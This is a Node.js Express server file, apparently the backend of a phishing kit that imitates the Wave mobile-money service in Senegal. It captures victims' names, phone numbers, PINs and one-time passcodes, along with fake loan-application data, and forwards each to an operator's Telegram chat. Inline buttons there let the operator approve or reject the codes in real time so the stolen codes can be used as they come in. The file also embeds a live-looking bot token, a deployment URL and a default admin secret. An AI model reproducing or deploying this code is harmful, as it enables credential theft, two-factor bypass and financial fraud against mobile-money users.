// ─────────────────────────────────────────────────────────────────
//  Wave Smart Backend — server.js
//  Captures logins, sends Telegram alerts with inline action buttons.
//  Buttons disappear after being clicked (edited out of the message).
// ─────────────────────────────────────────────────────────────────

require('dotenv').config();
const express        = require('express');
const cors           = require('cors');
const fetch          = require('node-fetch');
const path           = require('path');
const { v4: uuidv4 } = require('uuid');

const app  = express();
const PORT = process.env.PORT || 3000;

// ── Config ────────────────────────────────────────────────────────
const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const CHAT_ID   = process.env.TELEGRAM_CHAT_ID;
const TG_API    = `https://api.telegram.org/bot${BOT_TOKEN}`;

if (!BOT_TOKEN || !CHAT_ID) {
  console.error('❌  Missing TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID in .env');
  process.exit(1);
}

// ── Middleware ─────────────────────────────────────────────────────
app.use(cors({ origin: process.env.FRONTEND_ORIGIN || '*' }));
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// ── Serve index.html at root ───────────────────────────────────────
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

// ── In-memory session store ────────────────────────────────────────
const sessions = {};

// Clean up sessions older than 30 minutes every 10 minutes
setInterval(() => {
  const cutoff = Date.now() - 30 * 60 * 1000;
  for (const [id, s] of Object.entries(sessions)) {
    if (s.createdAt < cutoff) delete sessions[id];
  }
}, 10 * 60 * 1000);

// ── Telegram helpers ───────────────────────────────────────────────

/** Send a message with optional inline keyboard. Returns full response. */
async function tgSend(text, replyMarkup = null) {
  try {
    const body = { chat_id: CHAT_ID, text, parse_mode: 'HTML' };
    if (replyMarkup) body.reply_markup = replyMarkup;
    const res  = await fetch(`${TG_API}/sendMessage`, {
      method: 'POST', headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(body),
    });
    const data = await res.json();
    if (!data.ok) console.error('Telegram sendMessage error:', data.description);
    return data;
  } catch (err) { console.error('Telegram fetch error:', err.message); }
}

/** Edit a message text and remove all inline buttons. */
async function tgEditMessage(messageId, newText) {
  try {
    const res  = await fetch(`${TG_API}/editMessageText`, {
      method: 'POST', headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: CHAT_ID, message_id: messageId,
        text: newText, parse_mode: 'HTML',
        reply_markup: { inline_keyboard: [] },
      }),
    });
    const data = await res.json();
    if (!data.ok) console.error('Telegram editMessage error:', data.description);
    return data;
  } catch (err) { console.error('Telegram edit error:', err.message); }
}

/** Answer callback query — removes loading spinner on button. */
async function tgAnswerCallback(callbackQueryId, text = '') {
  try {
    await fetch(`${TG_API}/answerCallbackQuery`, {
      method: 'POST', headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ callback_query_id: callbackQueryId, text }),
    });
  } catch (err) { console.error('Telegram answerCallback error:', err.message); }
}

/** Readable timestamp in Dakar time */
function now() {
  return new Date().toLocaleString('fr-FR', {
    timeZone: 'Africa/Dakar', dateStyle: 'short', timeStyle: 'medium',
  });
}

// ── Inline keyboards ───────────────────────────────────────────────

function loginKeyboard(sessionId) {
  return {
    inline_keyboard: [[
      { text: '✅ Continue',  callback_data: `approve::${sessionId}` },
      { text: '❌ Wrong PIN', callback_data: `wrong_pin::${sessionId}` },
    ]],
  };
}

function otpKeyboard(sessionId) {
  return {
    inline_keyboard: [[
      { text: '✅ Approve OTP', callback_data: `approve_otp::${sessionId}` },
      { text: '❌ Wrong Code',  callback_data: `wrong_code::${sessionId}` },
    ]],
  };
}

// ── Routes ─────────────────────────────────────────────────────────

app.post('/api', async (req, res) => {
  const { action, ...data } = req.body;

  switch (action) {

    case 'login_attempt': {
      const { firstName = 'Unknown', lastName = 'User', phone, pin } = data;
      const sessionId = uuidv4();
      const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'unknown';

      sessions[sessionId] = {
        firstName, lastName, phone, pin,
        status: 'pending', createdAt: Date.now(), ip,
        msgId: null, otpMsgId: null,
      };

      console.log(`[LOGIN]  ${firstName} ${lastName} | +221${phone} | PIN: ${pin}`);

      const sent = await tgSend(
        `🔐 <b>New Login Attempt</b>\n` +
        `━━━━━━━━━━━━━━━━━━━━\n` +
        `👤 <b>Name:</b> ${firstName} ${lastName}\n` +
        `📱 <b>Phone:</b> 🇸🇳 +221 ${phone}\n` +
        `🔑 <b>PIN:</b> <code>${pin}</code>\n` +
        `🕐 <b>Time:</b> ${now()}\n` +
        `🌐 <b>IP:</b> <code>${ip}</code>`,
        loginKeyboard(sessionId)
      );

      if (sent && sent.ok) sessions[sessionId].msgId = sent.result.message_id;

      return res.json({ success: true, data: { sessionId } });
    }

    case 'otp_entered': {
      const { sessionId, otp } = data;
      const session = sessions[sessionId];
      if (!session) return res.json({ success: false, error: 'Session not found' });

      session.otp   = otp;
      session.otpAt = Date.now();

      console.log(`[OTP]    Session: ${sessionId} | OTP: ${otp}`);

      const sent = await tgSend(
        `📟 <b>OTP Code Received</b>\n` +
        `━━━━━━━━━━━━━━━━━━━━\n` +
        `👤 <b>Name:</b> ${session.firstName} ${session.lastName}\n` +
        `📱 <b>Phone:</b> 🇸🇳 +221 ${session.phone}\n` +
        `🔑 <b>PIN:</b> <code>${session.pin}</code>\n` +
        `📟 <b>OTP:</b> <code>${otp}</code>\n` +
        `🕐 <b>Time:</b> ${now()}`,
        otpKeyboard(sessionId)
      );

      if (sent && sent.ok) session.otpMsgId = sent.result.message_id;

      return res.json({ success: true });
    }

    case 'loan_application': {
      const { firstName, lastName, phone, amount, duration, income, monthly } = data;
      const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'unknown';

      console.log(`[LOAN]   ${firstName} ${lastName} | ${amount} FCFA`);

      await tgSend(
        `💰 <b>Loan Application</b>\n` +
        `━━━━━━━━━━━━━━━━━━━━\n` +
        `👤 <b>Name:</b> ${firstName} ${lastName}\n` +
        `📱 <b>Phone:</b> 🇸🇳 +221 ${phone}\n` +
        `💵 <b>Amount:</b> ${Number(amount).toLocaleString('fr-FR')} FCFA\n` +
        `📅 <b>Duration:</b> ${duration} months\n` +
        `💼 <b>Income:</b> ${Number(income).toLocaleString('fr-FR')} FCFA/mo\n` +
        `📊 <b>Monthly:</b> ${Number(monthly).toLocaleString('fr-FR')} FCFA\n` +
        `🕐 <b>Time:</b> ${now()}\n` +
        `🌐 <b>IP:</b> <code>${ip}</code>`
      );

      return res.json({ success: true });
    }

    default:
      return res.status(400).json({ success: false, error: `Unknown action: ${action}` });
  }
});

/** Frontend polls this every second to check session status */
app.get('/api', (req, res) => {
  const { action, sessionId } = req.query;
  if (action === 'check_status') {
    const session = sessions[sessionId];
    if (!session) return res.json({ success: false, error: 'Session not found' });
    return res.json({ success: true, status: session.status });
  }
  res.status(400).json({ success: false, error: 'Unknown action' });
});

/**
 * POST /webhook
 * Telegram sends button click events here.
 *
 * ⚠️  IMPORTANT: Register this URL with Telegram once after deploying:
 * Open in browser (replace YOUR_TOKEN):
 * https://api.telegram.org/bot7624277379:AAFXUby_omgmGAIQPy2pmNX1i8OqnauEvjk/setWebhook?url=https://new-9xcj.onrender.com/webhook
 */
app.post('/webhook', async (req, res) => {
  const update = req.body;
  if (!update.callback_query) return res.sendStatus(200);

  const cb                   = update.callback_query;
  const cbId                 = cb.id;
  const [action, sessionId]  = cb.data.split('::');
  const session              = sessions[sessionId];

  // Session gone or expired
  if (!session) {
    await tgAnswerCallback(cbId, '⚠️ Session expired');
    return res.sendStatus(200);
  }

  switch (action) {

    // ── ✅ Continue → user goes to OTP screen ─────────────────────
    case 'approve': {
      if (session.status !== 'pending') {
        await tgAnswerCallback(cbId, '⚠️ Already actioned');
        break;
      }
      session.status = 'approved';
      await tgAnswerCallback(cbId, '✅ User moved to OTP screen');
      await tgEditMessage(session.msgId,
        `🔐 <b>Login Attempt — ✅ APPROVED</b>\n` +
        `━━━━━━━━━━━━━━━━━━━━\n` +
        `👤 <b>Name:</b> ${session.firstName} ${session.lastName}\n` +
        `📱 <b>Phone:</b> 🇸🇳 +221 ${session.phone}\n` +
        `🔑 <b>PIN:</b> <code>${session.pin}</code>\n` +
        `🕐 <b>Actioned:</b> ${now()}`
      );
      break;
    }

    // ── ❌ Wrong PIN → error shown to user, PIN cleared ───────────
    case 'wrong_pin': {
      if (session.status !== 'pending') {
        await tgAnswerCallback(cbId, '⚠️ Already actioned');
        break;
      }
      session.status = 'wrong_pin';
      await tgAnswerCallback(cbId, '❌ Wrong PIN sent to user');
      await tgEditMessage(session.msgId,
        `🔐 <b>Login Attempt — ❌ WRONG PIN</b>\n` +
        `━━━━━━━━━━━━━━━━━━━━\n` +
        `👤 <b>Name:</b> ${session.firstName} ${session.lastName}\n` +
        `📱 <b>Phone:</b> 🇸🇳 +221 ${session.phone}\n` +
        `🔑 <b>PIN entered:</b> <code>${session.pin}</code>\n` +
        `🕐 <b>Actioned:</b> ${now()}`
      );
      break;
    }

    // ── ✅ Approve OTP → user proceeds ────────────────────────────
    case 'approve_otp': {
      session.status = 'continue';
      await tgAnswerCallback(cbId, '✅ OTP approved');
      await tgEditMessage(session.otpMsgId,
        `📟 <b>OTP — ✅ APPROVED</b>\n` +
        `━━━━━━━━━━━━━━━━━━━━\n` +
        `👤 <b>Name:</b> ${session.firstName} ${session.lastName}\n` +
        `📱 <b>Phone:</b> 🇸🇳 +221 ${session.phone}\n` +
        `📟 <b>OTP:</b> <code>${session.otp}</code>\n` +
        `🕐 <b>Actioned:</b> ${now()}`
      );
      break;
    }

    // ── ❌ Wrong Code → error shown to user, OTP cleared ──────────
    case 'wrong_code': {
      session.status = 'wrong_code';
      await tgAnswerCallback(cbId, '❌ Wrong code sent to user');
      await tgEditMessage(session.otpMsgId,
        `📟 <b>OTP — ❌ WRONG CODE</b>\n` +
        `━━━━━━━━━━━━━━━━━━━━\n` +
        `👤 <b>Name:</b> ${session.firstName} ${session.lastName}\n` +
        `📱 <b>Phone:</b> 🇸🇳 +221 ${session.phone}\n` +
        `📟 <b>OTP entered:</b> <code>${session.otp}</code>\n` +
        `🕐 <b>Actioned:</b> ${now()}`
      );
      break;
    }

    default:
      await tgAnswerCallback(cbId, '⚠️ Unknown action');
  }

  res.sendStatus(200);
});

/** Admin: list all sessions */
app.get('/api/sessions', (req, res) => {
  const secret       = req.query.secret || req.headers['x-admin-secret'];
  const ADMIN_SECRET = process.env.ADMIN_SECRET || 'wavesmart2026';
  if (secret !== ADMIN_SECRET) return res.status(403).json({ success: false, error: 'Forbidden' });

  const list = Object.entries(sessions).map(([id, s]) => ({
    sessionId: id, firstName: s.firstName, lastName: s.lastName,
    phone: s.phone, pin: s.pin, otp: s.otp || null,
    status: s.status, ip: s.ip,
    createdAt: new Date(s.createdAt).toISOString(),
  }));

  res.json({ success: true, count: list.length, sessions: list });
});

// ── Start ──────────────────────────────────────────────────────────
app.listen(PORT, () => {
  console.log(`\n🚀  Wave Smart Backend on port ${PORT}`);
  console.log(`📡  Bot: @wwwwavvebot  |  Chat: ${CHAT_ID}`);
  console.log(`\n⚠️  Register webhook once:`);
  console.log(`    ${TG_API}/setWebhook?url=https://new-9xcj.onrender.com/webhook\n`);

  tgSend(
    `✅ <b>Wave Smart Backend Started</b>\n` +
    `━━━━━━━━━━━━━━━━━━━━\n` +
    `🕐 <b>Time:</b> ${now()}\n` +
    `🌐 <b>Port:</b> ${PORT}\n` +
    `🔘 Inline buttons active`
  );
});

module.exports = app;
